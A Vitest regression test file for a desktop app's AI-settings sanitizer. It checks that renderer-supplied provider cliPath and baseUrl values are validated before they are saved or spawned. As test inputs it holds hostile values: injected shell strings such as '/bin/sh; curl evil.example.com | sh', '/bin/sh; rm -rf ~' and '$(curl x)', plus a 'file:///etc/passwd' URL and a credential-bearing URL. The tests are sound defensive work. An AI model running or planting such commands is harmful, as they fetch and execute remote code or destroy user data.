/**
 * Regression: 'ai:set-settings' wrote the renderer's payload to disk verbatim,
 * so a compromised renderer could plant providers.codex.cliPath (later spawn()ed
 * by the Codex app-server) or a providers.genspark.baseUrl that receives the
 * user's gsk bearer token. 'ai:stream' / 'ai:chat' consumed the same payload
 * per request without any check. The main process must schema-check first.
 */
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { homedir, tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, describe, expect, it, vi } from 'vitest'

import { sanitizeAiSettings, sanitizeCliPath, validCliPath } from '../src/ai-settings-guard'
import { normalizeBaseUrl } from '../src/registry'

const tempDirs: string[] = []

afterEach(() => {
  vi.unstubAllEnvs()
  for (const dir of tempDirs.splice(0)) rmSync(dir, { recursive: true, force: true })
})

function existingFilePath(): string {
  const dir = mkdtempSync(join(tmpdir(), 'genoffice-ai-guard-'))
  tempDirs.push(dir)
  const path = join(dir, 'codex')
  writeFileSync(path, '#!/bin/sh\n')
  return path
}

function baseSettings() {
  return {
    provider: 'openai',
    providers: {
      openai: { apiKey: 'sk-test', model: 'gpt-4o' },
      codex: { apiKey: '', model: 'codex-max' },
    },
    gskToolsEnabled: true,
    maxOutputTokens: 4096,
  }
}

describe('sanitizeAiSettings', () => {
  it('passes a legitimate settings payload through unchanged', () => {
    const sanitized = sanitizeAiSettings(baseSettings())
    expect(sanitized).not.toBeNull()
    expect(sanitized!.provider).toBe('openai')
    expect(sanitized!.providers.openai).toEqual({ apiKey: 'sk-test', model: 'gpt-4o' })
    expect(sanitized!.providers.codex).toEqual({ apiKey: '', model: 'codex-max' })
    expect(sanitized!.gskToolsEnabled).toBe(true)
    expect(sanitized!.maxOutputTokens).toBe(4096)
  })

  it('rejects payloads that are not the right shape at all', () => {
    for (const bad of [
      null,
      undefined,
      42,
      'settings',
      [],
      { provider: 'nope' },
      { provider: 'openai' },
    ]) {
      expect(sanitizeAiSettings(bad)).toBeNull()
    }
  })

  it('drops unknown provider entries and unknown top-level fields', () => {
    const sanitized = sanitizeAiSettings({
      ...baseSettings(),
      evilKey: 'x',
      providers: { openai: { apiKey: 'k', model: 'm' }, notAProvider: { apiKey: 'k' } },
    })
    expect(sanitized && 'evilKey' in sanitized).toBe(false)
    expect(Object.keys(sanitized!.providers)).toEqual(['openai'])
  })

  it('drops the reported attack payload verbatim shape (cliPath injection, ftp baseUrl)', () => {
    // exactly the payload the reviewer flagged: pre-guard, ai:set-settings
    // persisted this to ai-settings.json unchanged
    const sanitized = sanitizeAiSettings({
      ...baseSettings(),
      providers: {
        openai: { apiKey: 'k', model: 'm' },
        codex: { apiKey: '', model: 'c', cliPath: '/bin/sh; curl evil|sh' },
        genspark: { apiKey: '', model: 'g', baseUrl: 'ftp://evil.example.com' },
      },
    })
    expect(sanitized!.providers.codex.cliPath).toBeUndefined()
    expect(sanitized!.providers.genspark.baseUrl).toBeUndefined()
  })

  it('keeps only http(s) baseUrls without embedded credentials, normalized', () => {
    const sanitized = sanitizeAiSettings({
      ...baseSettings(),
      providers: {
        openai: { apiKey: 'k', model: 'm', baseUrl: 'https://api.example.com/v1/#frag' },
        codex: { apiKey: '', model: 'c', baseUrl: 'ftp://credential-less.example.com' },
        glm: { apiKey: 'k', model: 'm', baseUrl: 'https://user:pass@steal.example.com' },
      },
    })
    expect(sanitized!.providers.openai.baseUrl).toBe('https://api.example.com/v1/')
    expect(sanitized!.providers.codex.baseUrl).toBeUndefined()
    expect(sanitized!.providers.glm.baseUrl).toBeUndefined()
  })

  it('keeps cliPaths that exist as files, drops missing paths and directories', () => {
    const real = existingFilePath()
    const sanitized = sanitizeAiSettings({
      ...baseSettings(),
      providers: {
        openai: { apiKey: 'k', model: 'm' },
        codex: { apiKey: '', model: 'c' },
        glm: { apiKey: 'k', model: 'm', cliPath: '/bin/sh; curl evil.example.com | sh' },
        kimi: { apiKey: 'k', model: 'm', cliPath: '/nonexistent/codex' },
        qwen: { apiKey: 'k', model: 'm', cliPath: real },
        doubao: { apiKey: 'k', model: 'm', cliPath: 'codex' },
      },
    })
    // rejected by the existence check (no such file), not by a character class:
    // spawn() runs without a shell, so metacharacters are inert anyway
    expect(sanitized!.providers.glm.cliPath).toBeUndefined()
    expect(sanitized!.providers.kimi.cliPath).toBeUndefined()
    expect(sanitized!.providers.qwen.cliPath).toBe(real)
    // bare command names stay allowed: PATH resolution at spawn, ENOENT handled
    expect(sanitized!.providers.doubao.cliPath).toBe('codex')
  })

  it('keeps non-ASCII home paths (reviewer case: /Users/\u738b/bin/codex)', () => {
    // the old ASCII-only [\w./:\\ -] class dropped these, silently losing the
    // saved Codex CLI path on the next settings save
    const dir = mkdtempSync(join(tmpdir(), '\u738b-genoffice-ai-guard-'))
    tempDirs.push(dir)
    const cliPath = join(dir, 'bin', 'codex')
    mkdirSync(join(dir, 'bin'), { recursive: true })
    writeFileSync(cliPath, '#!/bin/sh\n')
    const sanitized = sanitizeAiSettings({
      ...baseSettings(),
      providers: {
        openai: { apiKey: 'k', model: 'm' },
        codex: { apiKey: '', model: 'c', cliPath },
      },
    })
    expect(sanitized!.providers.codex.cliPath).toBe(cliPath)
    expect(validCliPath(cliPath)).toBe(true)
  })

  it('keeps Windows-style paths with spaces and non-ASCII (reviewer case: C:\\Users\\Ana María\\codex.exe)', () => {
    // on POSIX the reviewer's string cannot name a real file, so exercise the
    // same shape (backslashes, dot, space, í) as a literal file name; on
    // Windows the exact reviewer string is stat'd directly and behaves the same
    const dir = mkdtempSync(join(tmpdir(), 'genoffice-ai-guard-'))
    tempDirs.push(dir)
    const cliPath = join(dir, 'C:\\Users\\Ana María\\codex.exe')
    writeFileSync(cliPath, 'bin\n')
    expect(validCliPath(cliPath)).toBe(true)
  })

  it('expands ~/bin/codex for the existence check and stores it expanded', () => {
    const home = mkdtempSync(join(tmpdir(), 'genoffice-ai-guard-home-'))
    tempDirs.push(home)
    mkdirSync(join(home, 'bin'), { recursive: true })
    writeFileSync(join(home, 'bin', 'codex'), '#!/bin/sh\n')
    vi.stubEnv('HOME', home)
    vi.stubEnv('USERPROFILE', home)
    expect(validCliPath('~/bin/codex')).toBe(true)
    expect(validCliPath('~/bin/missing')).toBe(false)
    const sanitized = sanitizeAiSettings({
      ...baseSettings(),
      providers: {
        openai: { apiKey: 'k', model: 'm' },
        codex: { apiKey: '', model: 'c', cliPath: '~/bin/codex' },
      },
    })
    // stored expanded: spawn() does not expand tilde and resolveCodexCliPath()
    // would treat the raw `~/…` value as a relative command name
    expect(sanitized!.providers.codex.cliPath).toBe(join(home, 'bin', 'codex'))
    // the codex-models probe spawns this value directly, so it needs the same form
    expect(sanitizeCliPath(' ~/bin/codex ')).toBe(join(home, 'bin', 'codex'))
    expect(sanitizeCliPath('~/bin/missing')).toBeUndefined()
    expect(sanitizeCliPath('codex')).toBe('codex')
  })

  it('coerces scalar fields and drops non-conforming optional ones', () => {
    const sanitized = sanitizeAiSettings({
      provider: 'openai',
      providers: { openai: { apiKey: 12345, model: ['gpt-4o'], baseUrl: 7 } },
      gskToolsEnabled: 'yes',
      maxOutputTokens: 'lots',
      media: { provider: 'genspark' },
      search: ['nope'],
    })
    expect(sanitized!.providers.openai.apiKey).toBe('12345')
    expect(sanitized!.providers.openai.model).toBe('gpt-4o')
    expect(sanitized!.providers.openai.baseUrl).toBeUndefined()
    expect(sanitized!.gskToolsEnabled).toBeUndefined()
    expect(sanitized!.maxOutputTokens).toBeUndefined()
    expect(sanitized!.media).toEqual({ provider: 'genspark' })
    expect(sanitized!.search).toBeUndefined()
  })

  it('drops a media provider baseUrl that fails the chat-provider URL gate', () => {
    const sanitized = sanitizeAiSettings({
      ...baseSettings(),
      media: {
        imageProvider: 'openai',
        providers: {
          openai: {
            apiKey: 'k',
            imageModel: '',
            analysisModel: '',
            baseUrl: 'https://u:p@evil.test/v1',
          },
          custom: {
            apiKey: 'k',
            imageModel: '',
            analysisModel: '',
            baseUrl: 'https://mirror.test/v1/',
          },
          gemini: { apiKey: 'k', imageModel: '', analysisModel: '', baseUrl: 'file:///etc/passwd' },
        },
      },
    })
    const providers = sanitized!.media!.providers as Record<string, { baseUrl?: string }>
    expect(providers.openai.baseUrl).toBeUndefined()
    expect(providers.custom.baseUrl).toBe(normalizeBaseUrl('https://mirror.test/v1/', ''))
    expect(providers.gemini.baseUrl).toBeUndefined()
  })
})

describe('validCliPath', () => {
  it('accepts an existing file path and bare commands', () => {
    const real = existingFilePath()
    expect(validCliPath(real)).toBe(true)
    expect(validCliPath('codex')).toBe(true)
    expect(validCliPath('  codex  ')).toBe(true)
  })

  it('accepts any characters in existing paths, including Unicode and spaces', () => {
    const dir = mkdtempSync(join(tmpdir(), 'genoffice-ai-guard-'))
    tempDirs.push(dir)
    const unicode = join(dir, '\u5de5\u5177', 'codex')
    mkdirSync(join(dir, '\u5de5\u5177'), { recursive: true })
    writeFileSync(unicode, '#!/bin/sh\n')
    const spaces = join(dir, 'App Support', 'codex.exe')
    mkdirSync(join(dir, 'App Support'), { recursive: true })
    writeFileSync(spaces, 'bin\n')
    expect(validCliPath(unicode)).toBe(true)
    expect(validCliPath(spaces)).toBe(true)
    expect(validCliPath(join(homedir(), 'definitely-not-a-real-codex-bin'))).toBe(false)
  })

  it('treats anything without path characters as a bare command (metacharacters are inert)', () => {
    // spawn() runs without a shell, so these resolve via PATH at spawn time
    // and a miss is a handled ENOENT — there is deliberately no character
    // filter left
    expect(validCliPath('`id`')).toBe(true)
    expect(validCliPath('$(curl x)')).toBe(true)
    expect(validCliPath('a | b')).toBe(true)
  })

  it('rejects missing paths, directories, and non-strings', () => {
    const dir = mkdtempSync(join(tmpdir(), 'genoffice-ai-guard-'))
    tempDirs.push(dir)
    // path-like values must exist as a file
    expect(validCliPath('/bin/sh; rm -rf ~')).toBe(false)
    expect(validCliPath(join(dir, 'missing'))).toBe(false)
    expect(validCliPath(dir)).toBe(false) // exists but is a directory
    expect(validCliPath(42)).toBe(false)
    expect(validCliPath('')).toBe(false)
  })
})
